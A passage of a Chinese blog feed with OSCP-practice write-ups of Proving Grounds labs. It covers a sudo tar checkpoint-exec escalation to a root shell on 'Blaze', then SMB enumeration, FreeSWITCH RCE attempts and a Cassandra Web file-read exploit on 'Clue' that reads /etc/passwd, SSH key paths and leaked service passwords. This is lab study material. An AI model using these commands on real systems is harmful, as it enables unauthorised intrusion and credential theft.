<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for james on blaze<span class="punctuation">:</span></span><br><span class="line">    env_reset<span class="punctuation">,</span> mail_badpass<span class="punctuation">,</span> secure_path=/usr/local/sbin\<span class="punctuation">:</span>/usr/local/bin\<span class="punctuation">:</span>/usr/sbin\<span class="punctuation">:</span>/usr/bin\<span class="punctuation">:</span>/sbin\<span class="punctuation">:</span>/bin\<span class="punctuation">:</span>/snap/bin</span><br><span class="line"></span><br><span class="line">User james may run the following commands on blaze<span class="punctuation">:</span></span><br><span class="line">    (ALL) NOPASSWD<span class="punctuation">:</span> /usr/bin/tar -czvf /tmp/backup.tar.gz *</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * --checkpoint=<span class="number">1</span> --checkpoint-action=exec=/bin/sh</span><br><span class="line">apt-changelog-ZA6iyM/</span><br><span class="line">snap-private-tmp/</span><br><span class="line">snap-private-tmp/snap.lxd/</span><br><span class="line">snap-private-tmp/snap.lxd/tmp/</span><br><span class="line">ssh<span class="number">-6</span>KkSqBBpG1eF/</span><br><span class="line">/usr/bin/tar<span class="punctuation">:</span> ssh<span class="number">-6</span>KkSqBBpG1eF/agent<span class="number">.131828</span><span class="punctuation">:</span> socket ignored</span><br><span class="line">systemd-private<span class="number">-1</span>c25937d4cfb4fd0b9e84c8d8e470646-apache2.service<span class="number">-43</span>mHFi/</span><br><span class="line">systemd-private<span class="number">-1</span>c25937d4cfb4fd0b9e84c8d8e470646-apache2.service<span class="number">-43</span>mHFi/tmp/</span><br><span class="line">systemd-private<span class="number">-1</span>c25937d4cfb4fd0b9e84c8d8e470646-ModemManager.service-l1tS1f/</span><br><span class="line">systemd-private<span class="number">-1</span>c25937d4cfb4fd0b9e84c8d8e470646-ModemManager.service-l1tS1f/tmp/</span><br><span class="line">systemd-private<span class="number">-1</span>c25937d4cfb4fd0b9e84c8d8e470646-systemd-logind.service<span class="number">-0</span>vp5Lh/</span><br><span class="line">systemd-private<span class="number">-1</span>c25937d4cfb4fd0b9e84c8d8e470646-systemd-logind.service<span class="number">-0</span>vp5Lh/tmp/</span><br><span class="line">systemd-private<span class="number">-1</span>c25937d4cfb4fd0b9e84c8d8e470646-systemd-resolved.service-pGOwNf/</span><br><span class="line">systemd-private<span class="number">-1</span>c25937d4cfb4fd0b9e84c8d8e470646-systemd-resolved.service-pGOwNf/tmp/</span><br><span class="line">systemd-private<span class="number">-1</span>c25937d4cfb4fd0b9e84c8d8e470646-systemd-timesyncd.service-Ll8SPh/</span><br><span class="line">systemd-private<span class="number">-1</span>c25937d4cfb4fd0b9e84c8d8e470646-systemd-timesyncd.service-Ll8SPh/tmp/</span><br><span class="line">systemd-private<span class="number">-1</span>c25937d4cfb4fd0b9e84c8d8e470646-upower.service<span class="number">-65</span>G4Yi/</span><br><span class="line">systemd-private<span class="number">-1</span>c25937d4cfb4fd0b9e84c8d8e470646-upower.service<span class="number">-65</span>G4Yi/tmp/</span><br><span class="line">tmp.es7Hxs9VMb</span><br><span class="line">tmp.eXjbihXM2N</span><br><span class="line">tmp.gvPWK74jcw</span><br><span class="line"># id</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line"># whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><ol>
<li><p>最近刷lab都是使用已知漏洞，最应该尝试的sql注入都没有测试</p>
</li>
<li><p>发现无法利用的exploit 不要死磕？oscp不会考需要修改很多才能利用的题目？</p>
</li>
</ol>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Clue</title>
    <url>/post/20250214231937.html</url>
    <content><![CDATA[<h1 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h1><h2 id="autorecon"><a href="#autorecon" class="headerlink" title="autorecon"></a>autorecon</h2><p><img data-src="https://thiiiiink.com/202508/asynccode-36.png.png"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">- os</span><br><span class="line">Debian Linux</span><br><span class="line">OS<span class="punctuation">:</span> Linux/Unix (Samba <span class="number">4.9</span><span class="number">.5</span>-Debian)</span><br><span class="line">OS version<span class="punctuation">:</span> &#x27;<span class="number">6.1</span>&#x27;</span><br><span class="line">OS release<span class="punctuation">:</span> &#x27;&#x27;</span><br><span class="line">OS build<span class="punctuation">:</span> &#x27;<span class="number">0</span>&#x27;</span><br><span class="line">Native OS<span class="punctuation">:</span> Windows <span class="number">6.1</span></span><br><span class="line">Native LAN manager<span class="punctuation">:</span> Samba <span class="number">4.9</span><span class="number">.5</span>-Debian</span><br><span class="line">Platform id<span class="punctuation">:</span> &#x27;<span class="number">500</span>&#x27;</span><br><span class="line">Server type<span class="punctuation">:</span> &#x27;<span class="number">0x809a03</span>&#x27;</span><br><span class="line"></span><br><span class="line">- ports</span><br><span class="line"></span><br><span class="line">- <span class="number">22</span> </span><br><span class="line">  openssh <span class="number">7.9</span>p1</span><br><span class="line"></span><br><span class="line">- <span class="number">80</span></span><br><span class="line">  apache <span class="number">2.4</span><span class="number">.38</span></span><br><span class="line">  首页<span class="number">403</span> </span><br><span class="line">  扫到/backup文件夹</span><br><span class="line"></span><br><span class="line">- <span class="number">139</span></span><br><span class="line"></span><br><span class="line">- <span class="number">445</span></span><br><span class="line">  SMB <span class="number">3.0</span></span><br><span class="line"></span><br><span class="line">    freeswitch</span><br><span class="line">    cassandra</span><br><span class="line"></span><br><span class="line">      csmb<span class="punctuation">:</span> \freeswitch\usr\&gt; cd bin</span><br><span class="line">    smb<span class="punctuation">:</span> \freeswitch\usr\bin\&gt; ls</span><br><span class="line">      .                                   D        <span class="number">0</span>  Mon Oct <span class="number">25</span> <span class="number">01</span><span class="punctuation">:</span><span class="number">26</span><span class="punctuation">:</span><span class="number">29</span> <span class="number">2021</span></span><br><span class="line">      ..                                  D        <span class="number">0</span>  Mon Oct <span class="number">25</span> <span class="number">01</span><span class="punctuation">:</span><span class="number">26</span><span class="punctuation">:</span><span class="number">29</span> <span class="number">2021</span></span><br><span class="line">      tone2wav                            N    <span class="number">14512</span>  Mon Oct <span class="number">25</span> <span class="number">01</span><span class="punctuation">:</span><span class="number">26</span><span class="punctuation">:</span><span class="number">29</span> <span class="number">2021</span></span><br><span class="line">      fs_ivrd                             N    <span class="number">68320</span>  Mon Oct <span class="number">25</span> <span class="number">01</span><span class="punctuation">:</span><span class="number">26</span><span class="punctuation">:</span><span class="number">29</span> <span class="number">2021</span></span><br><span class="line">      fs_cli                              N    <span class="number">98624</span>  Mon Oct <span class="number">25</span> <span class="number">01</span><span class="punctuation">:</span><span class="number">26</span><span class="punctuation">:</span><span class="number">29</span> <span class="number">2021</span></span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">- <span class="number">3000</span> </span><br><span class="line">  vary<span class="punctuation">:</span>oprigin</span><br><span class="line">  Cassandra web</span><br><span class="line"></span><br><span class="line">  存在backup/cert</span><br></pre></td></tr></table></figure>

<h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><h2 id="smb匿名登录"><a href="#smb匿名登录" class="headerlink" title="smb匿名登录"></a>smb匿名登录</h2><p>发现freeswitch和cassandra文件夹</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb<span class="punctuation">:</span> \&gt; ls</span><br><span class="line">  .                                   D        <span class="number">0</span>  Fri Aug  <span class="number">5</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">43</span><span class="punctuation">:</span><span class="number">50</span> <span class="number">2022</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Fri Aug  <span class="number">5</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">43</span><span class="punctuation">:</span><span class="number">44</span> <span class="number">2022</span></span><br><span class="line">  freeswitch                          D        <span class="number">0</span>  Fri Aug  <span class="number">5</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">43</span><span class="punctuation">:</span><span class="number">51</span> <span class="number">2022</span></span><br><span class="line">  cassandra                           D        <span class="number">0</span>  Fri May  <span class="number">6</span> <span class="number">23</span><span class="punctuation">:</span><span class="number">04</span><span class="punctuation">:</span><span class="number">47</span> <span class="number">2022</span></span><br><span class="line"></span><br><span class="line">                <span class="number">14343176</span> blocks of size <span class="number">1024.</span> <span class="number">10599324</span> blocks available</span><br><span class="line">smb<span class="punctuation">:</span> \&gt; cd freeswitch\</span><br><span class="line">smb<span class="punctuation">:</span> \freeswitch\&gt; ls</span><br><span class="line">  .                                   D        <span class="number">0</span>  Fri Aug  <span class="number">5</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">43</span><span class="punctuation">:</span><span class="number">51</span> <span class="number">2022</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Fri Aug  <span class="number">5</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">43</span><span class="punctuation">:</span><span class="number">50</span> <span class="number">2022</span></span><br><span class="line">  usr                                 D        <span class="number">0</span>  Mon Oct <span class="number">25</span> <span class="number">01</span><span class="punctuation">:</span><span class="number">26</span><span class="punctuation">:</span><span class="number">29</span> <span class="number">2021</span></span><br><span class="line">  var                                 D        <span class="number">0</span>  Mon Oct <span class="number">25</span> <span class="number">01</span><span class="punctuation">:</span><span class="number">26</span><span class="punctuation">:</span><span class="number">29</span> <span class="number">2021</span></span><br><span class="line">  etc                                 D        <span class="number">0</span>  Fri Aug  <span class="number">5</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">43</span><span class="punctuation">:</span><span class="number">51</span> <span class="number">2022</span></span><br><span class="line"></span><br><span class="line">                <span class="number">14343176</span> blocks of size <span class="number">1024.</span> <span class="number">10599324</span> blocks available</span><br><span class="line">smb<span class="punctuation">:</span> \freeswitch\&gt; cat /etc/</span><br><span class="line">cat<span class="punctuation">:</span> command not found</span><br><span class="line">smb<span class="punctuation">:</span> \freeswitch\&gt; ls</span><br><span class="line">  .                                   D        <span class="number">0</span>  Fri Aug  <span class="number">5</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">43</span><span class="punctuation">:</span><span class="number">51</span> <span class="number">2022</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Fri Aug  <span class="number">5</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">43</span><span class="punctuation">:</span><span class="number">50</span> <span class="number">2022</span></span><br><span class="line">  usr                                 D        <span class="number">0</span>  Mon Oct <span class="number">25</span> <span class="number">01</span><span class="punctuation">:</span><span class="number">26</span><span class="punctuation">:</span><span class="number">29</span> <span class="number">2021</span></span><br><span class="line">  var                                 D        <span class="number">0</span>  Mon Oct <span class="number">25</span> <span class="number">01</span><span class="punctuation">:</span><span class="number">26</span><span class="punctuation">:</span><span class="number">29</span> <span class="number">2021</span></span><br><span class="line">  etc                                 D        <span class="number">0</span>  Fri Aug  <span class="number">5</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">43</span><span class="punctuation">:</span><span class="number">51</span> <span class="number">2022</span></span><br><span class="line"></span><br><span class="line">                <span class="number">14343176</span> blocks of size <span class="number">1024.</span> <span class="number">10599324</span> blocks available</span><br><span class="line">smb<span class="punctuation">:</span> \freeswitch\&gt; cd etc\</span><br><span class="line">smb<span class="punctuation">:</span> \freeswitch\etc\&gt; ls</span><br><span class="line">  .                                   D        <span class="number">0</span>  Fri Aug  <span class="number">5</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">43</span><span class="punctuation">:</span><span class="number">51</span> <span class="number">2022</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Fri Aug  <span class="number">5</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">43</span><span class="punctuation">:</span><span class="number">51</span> <span class="number">2022</span></span><br><span class="line">  freeswitch                          D        <span class="number">0</span>  Mon Oct <span class="number">25</span> <span class="number">01</span><span class="punctuation">:</span><span class="number">23</span><span class="punctuation">:</span><span class="number">57</span> <span class="number">2021</span></span><br><span class="line"></span><br><span class="line">                <span class="number">14343176</span> blocks of size <span class="number">1024.</span> <span class="number">10599324</span> blocks available</span><br><span class="line">smb<span class="punctuation">:</span> \freeswitch\etc\&gt; cd freeswitch\</span><br><span class="line">smb<span class="punctuation">:</span> \freeswitch\etc\freeswitch\&gt; ls</span><br><span class="line">  .                                   D        <span class="number">0</span>  Mon Oct <span class="number">25</span> <span class="number">01</span><span class="punctuation">:</span><span class="number">23</span><span class="punctuation">:</span><span class="number">57</span> <span class="number">2021</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Fri Aug  <span class="number">5</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">43</span><span class="punctuation">:</span><span class="number">51</span> <span class="number">2022</span></span><br><span class="line">  vars.xml                            N    <span class="number">19463</span>  Mon Oct <span class="number">25</span> <span class="number">01</span><span class="punctuation">:</span><span class="number">23</span><span class="punctuation">:</span><span class="number">57</span> <span class="number">2021</span></span><br><span class="line">  tetris.ttml                         N     <span class="number">1157</span>  Mon Oct <span class="number">25</span> <span class="number">01</span><span class="punctuation">:</span><span class="number">23</span><span class="punctuation">:</span><span class="number">57</span> <span class="number">2021</span></span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line"> smb<span class="punctuation">:</span> \&gt; cd cassandra\</span><br><span class="line">smb<span class="punctuation">:</span> \cassandra\&gt; ls</span><br><span class="line">  .                                   D        <span class="number">0</span>  Fri May  <span class="number">6</span> <span class="number">23</span><span class="punctuation">:</span><span class="number">04</span><span class="punctuation">:</span><span class="number">47</span> <span class="number">2022</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Fri Aug  <span class="number">5</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">43</span><span class="punctuation">:</span><span class="number">50</span> <span class="number">2022</span></span><br><span class="line">  usr                                 D        <span class="number">0</span>  Fri May  <span class="number">6</span> <span class="number">23</span><span class="punctuation">:</span><span class="number">04</span><span class="punctuation">:</span><span class="number">47</span> <span class="number">2022</span></span><br><span class="line">  var                                 D        <span class="number">0</span>  Fri May  <span class="number">6</span> <span class="number">23</span><span class="punctuation">:</span><span class="number">04</span><span class="punctuation">:</span><span class="number">47</span> <span class="number">2022</span></span><br><span class="line">  etc                                 D        <span class="number">0</span>  Fri May  <span class="number">6</span> <span class="number">23</span><span class="punctuation">:</span><span class="number">04</span><span class="punctuation">:</span><span class="number">47</span> <span class="number">2022</span></span><br><span class="line"></span><br><span class="line">                <span class="number">14343176</span> blocks of size <span class="number">1024.</span> <span class="number">10599320</span> blocks available</span><br><span class="line">smb<span class="punctuation">:</span> \cassandra\&gt;</span><br></pre></td></tr></table></figure>

<h2 id="freeswitch"><a href="#freeswitch" class="headerlink" title="freeswitch"></a>freeswitch</h2><p>经过搜索 freeswitch存在RCE漏洞</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-38.png.png"></p>
<p>执行payload提示 auth invalid</p>
<p>从github有下载了exploit payload一样提示auth faild</p>
<blockquote>
<p><a href="http://github.com:Chocapikk/CVE-2019-19492.git">http://github.com:Chocapikk/CVE-2019-19492.git</a></p>
</blockquote>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">python exploit.py --target <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span></span><br><span class="line"></span><br><span class="line">b&#x27;Content-Type<span class="punctuation">:</span> command/reply\nReply-Text<span class="punctuation">:</span> -ERR invalid\n\nContent-Type<span class="punctuation">:</span> text/disconnect-notice\nContent-Length<span class="punctuation">:</span> <span class="number">67</span>\n\nDisconnected<span class="punctuation">,</span> goodbye.\nSee you at ClueCon! http<span class="punctuation">:</span><span class="comment">//www.cluecon.com/\n&#x27;</span></span><br><span class="line">Authentication failed - <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span><span class="punctuation">:</span><span class="number">8021</span></span><br><span class="line">Not vulnerable</span><br></pre></td></tr></table></figure>

<p>利用代码中password是默认密码ClueCon</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">ADDRESS=sys.argv<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">]</span></span><br><span class="line">CMD=sys.argv<span class="punctuation">[</span><span class="number">2</span><span class="punctuation">]</span></span><br><span class="line">PASSWORD=&#x27;ClueCon&#x27; # default password for FreeSWITCH</span><br></pre></td></tr></table></figure>

<h2 id="cassandra"><a href="#cassandra" class="headerlink" title="cassandra"></a>cassandra</h2><p>cassandra 存在任意文件读取漏洞</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-37.png.png"></p>
<p>读取&#x2F;etc&#x2F;passwd发现三个用户 root&#x2F;cassie&#x2F;anthony</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">python <span class="number">49362.</span>py <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span> /etc/passwd</span><br><span class="line"></span><br><span class="line">root<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span>root<span class="punctuation">:</span>/root<span class="punctuation">:</span>/bin/bash</span><br><span class="line">daemon<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">1</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">:</span>daemon<span class="punctuation">:</span>/usr/sbin<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">bin<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">2</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">:</span>bin<span class="punctuation">:</span>/bin<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">sys<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">3</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">:</span>sys<span class="punctuation">:</span>/dev<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">sync<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">4</span><span class="punctuation">:</span><span class="number">65534</span><span class="punctuation">:</span>sync<span class="punctuation">:</span>/bin<span class="punctuation">:</span>/bin/sync</span><br><span class="line">games<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">5</span><span class="punctuation">:</span><span class="number">60</span><span class="punctuation">:</span>games<span class="punctuation">:</span>/usr/games<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">man<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">6</span><span class="punctuation">:</span><span class="number">12</span><span class="punctuation">:</span>man<span class="punctuation">:</span>/var/cache/man<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">lp<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span>lp<span class="punctuation">:</span>/var/spool/lpd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">mail<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">8</span><span class="punctuation">:</span><span class="number">8</span><span class="punctuation">:</span>mail<span class="punctuation">:</span>/var/mail<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">news<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">9</span><span class="punctuation">:</span><span class="number">9</span><span class="punctuation">:</span>news<span class="punctuation">:</span>/var/spool/news<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">uucp<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">10</span><span class="punctuation">:</span><span class="number">10</span><span class="punctuation">:</span>uucp<span class="punctuation">:</span>/var/spool/uucp<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">proxy<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">13</span><span class="punctuation">:</span><span class="number">13</span><span class="punctuation">:</span>proxy<span class="punctuation">:</span>/bin<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">www-data<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">33</span><span class="punctuation">:</span><span class="number">33</span><span class="punctuation">:</span>www-data<span class="punctuation">:</span>/var/www<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">backup<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">34</span><span class="punctuation">:</span><span class="number">34</span><span class="punctuation">:</span>backup<span class="punctuation">:</span>/var/backups<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">list<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">38</span><span class="punctuation">:</span><span class="number">38</span><span class="punctuation">:</span>Mailing List Manager<span class="punctuation">:</span>/var/list<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">irc<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">39</span><span class="punctuation">:</span><span class="number">39</span><span class="punctuation">:</span>ircd<span class="punctuation">:</span>/var/run/ircd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">gnats<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">41</span><span class="punctuation">:</span><span class="number">41</span><span class="punctuation">:</span>Gnats Bug-Reporting System (admin)<span class="punctuation">:</span>/var/lib/gnats<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">nobody<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">65534</span><span class="punctuation">:</span><span class="number">65534</span><span class="punctuation">:</span>nobody<span class="punctuation">:</span>/nonexistent<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">_apt<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">100</span><span class="punctuation">:</span><span class="number">65534</span><span class="punctuation">:</span><span class="punctuation">:</span>/nonexistent<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">systemd-timesync<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">101</span><span class="punctuation">:</span><span class="number">102</span><span class="punctuation">:</span>systemd Time Synchronization<span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">:</span>/run/systemd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">systemd-network<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">102</span><span class="punctuation">:</span><span class="number">103</span><span class="punctuation">:</span>systemd Network Management<span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">:</span>/run/systemd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">systemd-resolve<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">103</span><span class="punctuation">:</span><span class="number">104</span><span class="punctuation">:</span>systemd Resolver<span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">:</span>/run/systemd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">messagebus<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">104</span><span class="punctuation">:</span><span class="number">110</span><span class="punctuation">:</span><span class="punctuation">:</span>/nonexistent<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">sshd<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">105</span><span class="punctuation">:</span><span class="number">65534</span><span class="punctuation">:</span><span class="punctuation">:</span>/run/sshd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">systemd-coredump<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">999</span><span class="punctuation">:</span><span class="number">999</span><span class="punctuation">:</span>systemd Core Dumper<span class="punctuation">:</span>/<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">ntp<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">106</span><span class="punctuation">:</span><span class="number">113</span><span class="punctuation">:</span><span class="punctuation">:</span>/nonexistent<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">cassandra<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">107</span><span class="punctuation">:</span><span class="number">114</span><span class="punctuation">:</span>Cassandra database<span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">:</span>/var/lib/cassandra<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">cassie<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">1000</span><span class="punctuation">:</span><span class="number">1000</span><span class="punctuation">:</span><span class="punctuation">:</span>/home/cassie<span class="punctuation">:</span>/bin/bash</span><br><span class="line">freeswitch<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">998</span><span class="punctuation">:</span><span class="number">998</span><span class="punctuation">:</span>FreeSWITCH<span class="punctuation">:</span>/var/lib/freeswitch<span class="punctuation">:</span>/bin/<span class="literal"><span class="keyword">false</span></span></span><br><span class="line">anthony<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">1001</span><span class="punctuation">:</span><span class="number">1001</span><span class="punctuation">:</span><span class="punctuation">:</span>/home/anthony<span class="punctuation">:</span>/bin/bash</span><br></pre></td></tr></table></figure>

<p>第一想法是是否可以读取某个用户的私钥信息，但是发现都读不到，唯一可以读取到的就是cassie&#x2F;.ssh&#x2F;known_hosts</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">python <span class="number">49362.</span>py <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span> /home/cassie/.ssh/id_rsa</span><br><span class="line">Failed to read /home/cassie/.ssh/id_rsa (bad path?)</span><br><span class="line"></span><br><span class="line">python <span class="number">49362.</span>py <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span> /home/anthony/.ssh/id_rsa</span><br><span class="line">Failed to read /home/anthony/.ssh/id_rsa (bad path?)</span><br><span class="line"></span><br><span class="line">python <span class="number">49362.</span>py <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span> /root/.ssh/id_rsa</span><br><span class="line">Failed to read /root/.ssh/id_rsa (bad path?)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python <span class="number">49362.</span>py <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span> /home/cassie/.ssh/known_hosts</span><br><span class="line">|<span class="number">1</span>|cl0mW7klh2+eUO1GAszDa6SDpRI=|jSUa2FlglH9H3qUYQbfvLix8ino= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=</span><br></pre></td></tr></table></figure>

<p>然后想到可以试下读取freeswitch的密码，搜索默认密码的存储位置是&#x2F;usr&#x2F;local&#x2F;freeswitch&#x2F;conf&#x2F;autoload_configs&#x2F;xml_rpc.conf.xml， 但是仍没有读到信息</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">python <span class="number">49362.</span>py <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span> /usr/local/freeswitch/conf/autoload_configs/xml_rpc.conf.xml</span><br><span class="line">Failed to read /usr/local/freeswitch/conf/autoload_configs/xml_rpc.conf.xml (bad path?)</span><br></pre></td></tr></table></figure>

<p>然后又尝试读crontab等其他文件，没有什么可以利用的方式。看一下当前进程，但是当时账号和密码被我忽略了，没有细看，只扫到执行了cassandra-web命令</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">python <span class="number">49362.</span>py <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span> /proc/self/cmdline</span><br><span class="line"></span><br><span class="line">/usr/bin/ruby2<span class="number">.5</span>/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330</span><br></pre></td></tr></table></figure>

<p>单纯文件读取无法执行命令，读不到敏感信息，没法拿下机器，还是需要寄希望于freeswtich 命令执行漏洞。</p>
<p>再检查了一遍backup文件夹，看是不是能找到有用的信息，是不是可能有密码，使用smbclient一个个检查效率太低, 直接把远程smb挂载到本地</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">sudo mount.cifs <span class="comment">//192.168.166.240/backup ./backup -o guest</span></span><br></pre></td></tr></table></figure>

<p>在vscode中打开，搜索pass, 找到密码确实是ClueCon, 然后我测试了所有搜索pass找到的疑似的密码，全部都invalid。</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-40.png.png"></p>
<h2 id="File-Read-Cmd-Execute"><a href="#File-Read-Cmd-Execute" class="headerlink" title="File Read &amp; Cmd Execute"></a>File Read &amp; Cmd Execute</h2><p>后来突然想到，在任意文件读取的时候不知道有哪些文件，所以没法找到有效信息，backup里就有文件的路径。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">python <span class="number">49362.</span>py <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span> /etc/freeswitch/autoload_configs/event_socket.conf.xml</span><br><span class="line"></span><br><span class="line">&lt;configuration name=<span class="string">&quot;event_socket.conf&quot;</span> description=<span class="string">&quot;Socket Client&quot;</span>&gt;</span><br><span class="line">  &lt;settings&gt;</span><br><span class="line">    &lt;param name=<span class="string">&quot;nat-map&quot;</span> value=<span class="string">&quot;false&quot;</span>/&gt;</span><br><span class="line">    &lt;param name=<span class="string">&quot;listen-ip&quot;</span> value=<span class="string">&quot;0.0.0.0&quot;</span>/&gt;</span><br><span class="line">    &lt;param name=<span class="string">&quot;listen-port&quot;</span> value=<span class="string">&quot;8021&quot;</span>/&gt;</span><br><span class="line">    &lt;param name=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;StrongClueConEight021&quot;</span>/&gt;</span><br><span class="line">  &lt;/settings&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>

<p>果然读到了服务器上的密码</p>
